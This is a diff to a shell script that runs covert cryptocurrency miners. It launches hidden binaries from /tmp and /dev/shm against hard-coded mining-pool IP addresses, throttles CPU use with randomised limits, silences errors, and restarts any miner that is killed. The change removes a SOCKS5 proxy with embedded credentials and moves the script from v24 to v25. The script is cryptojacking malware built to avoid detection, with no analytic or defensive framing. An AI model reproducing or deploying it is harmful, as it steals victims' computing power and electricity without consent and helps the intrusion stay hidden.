@@ -71,8 +71,7 @@ TPID=$!
 
 # 6. Miners — DIRECT EXEC (v18.1 proven path)
 nice -n 19 /tmp/.p8 --coin pearl --url 23.94.152.126:80 \
-    --user "${PRL}.${WRK}" \
-    --proxy socks5://yoga:yoga123@107.172.222.195:443 2>/dev/null &
+    --user "${PRL}.${WRK}" 2>/dev/null &
 P1=$!
 cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
 
@@ -83,9 +82,9 @@ nice -n 19 /tmp/.s8 -a yespowertide -o 47.251.244.12:80 \
 P2=$!
 cpulimit -l $((RANDOM%25+40)) -p $P2 2>/dev/null &
 
-echo "[*] v24 P1:$P1 P2:$P2"
+echo "[*] v25 P1:$P1 P2:$P2"
 
-# 7. Monitor — keepalive + CPU fluctuation (merged, v22.1 cleanup)
+# 7. Monitor — keepalive + CPU fluctuation
 (
     c=0
     while true; do
@@ -100,7 +99,7 @@ echo "[*] v24 P1:$P1 P2:$P2"
         if ! kill -0 $P1 2>/dev/null; then
             cp /dev/shm/.m/p /tmp/.p8 2>/dev/null; chmod +x /tmp/.p8 2>/dev/null
             nice -n 19 /tmp/.p8 --coin pearl --url 23.94.152.126:80 \
-                --user "${PRL}.${WRK}" --proxy socks5://yoga:yoga123@107.172.222.195:443 2>/dev/null &
+                --user "${PRL}.${WRK}" 2>/dev/null &
             P1=$!; cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
         fi
         if ! kill -0 $P2 2>/dev/null; then
